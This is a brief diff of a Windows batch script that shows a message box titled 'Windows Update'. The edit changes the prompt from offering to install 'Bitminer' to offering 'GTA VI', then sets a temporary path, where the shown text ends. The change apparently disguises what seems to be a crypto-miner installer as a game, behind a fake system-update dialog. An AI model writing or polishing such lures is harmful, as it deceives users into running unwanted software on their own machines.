@@ -1,7 +1,7 @@
 @echo off
 
 :: Show a message box
-powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Do you want to install Bitminer', 'Windows Update')"
+powershell -Command "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.MessageBox]::Show('Do you want to install GTA VI', 'Windows Update')"
 
 :: Set the path to the temporary directory
 set tempPath=%TEMP%
